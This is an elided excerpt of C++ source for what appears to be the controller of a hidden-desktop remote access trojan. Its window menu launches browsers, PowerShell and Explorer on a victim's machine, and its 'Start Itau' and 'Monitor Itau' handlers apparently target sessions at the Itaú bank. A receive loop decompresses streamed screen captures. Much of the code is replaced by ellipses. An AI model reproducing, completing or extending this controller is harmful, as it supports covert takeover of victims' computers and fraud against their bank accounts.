...
enum SysMenuIds   { fullScreen = 101, startExplorer = WM_USER + 1, startRun, startChrome, startEdge, startBrave, startFirefox, startIexplore, startPowershell, startItau, monitorItau
};
...
static LRESULT CALLBACK WndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
   ...
   switch(msg)
   {
      case WM_CREATE:
      {
		 ...
		 // AppendMenu(hSysMenu, MF_STRING, SysMenuIds::startItau,			TEXT("Start Itau")); 
		 // AppendMenu(hSysMenu, MF_STRING, SysMenuIds::monitorItau,		TEXT("Monitor Itau")); 
...
*/
		 ...
		 else if (wParam == SysMenuIds::startItau)
		 {
			 EnterCriticalSection(&g_critSec);
			 if (!SendInput(client->connections[Connection::input], SysMenuIds::startItau, NULL, NULL))
				 PostQuitMessage(0);
			 LeaveCriticalSection(&g_critSec);
			 break;
		 }
		 else if (wParam == SysMenuIds::monitorItau)
		 {
			 EnterCriticalSection(&g_critSec);
			 if (!SendInput(client->connections[Connection::input], SysMenuIds::monitorItau, NULL, NULL))
				 PostQuitMessage(0);
			 LeaveCriticalSection(&g_critSec);
			 break;
		 }
      ...
      {  
		 ...
		 //can't understand why we should use 18 for indent
         BitBlt(hDc, 0, 0, client->pixelsWidth, client->pixelsHeight, client->hDcBmp, 18, 0, SRCCOPY);
	      EndPaint(hWnd, &ps);
         break;
      }
      case WM_DESTROY:
...
static DWORD WINAPI ClientThread(PVOID param)
{
   ...
   if(connection == Connection::desktop)
   {
      ...
      for(;;)
      {
         ...
         EnterCriticalSection(&g_critSec);
         {
            DWORD newPixelsSize = width * 4 * height;
			...
			if (status != 0) {
				printf("[-] LZNT1 decompression failed: 0x%X\n", status);
...
BOOL StartServer(int port)
{
   ...
   pRtlDecompressBuffer = (T_RtlDecompressBuffer) GetProcAddress(ntdll, R"(RtlDecompressBuffer)");
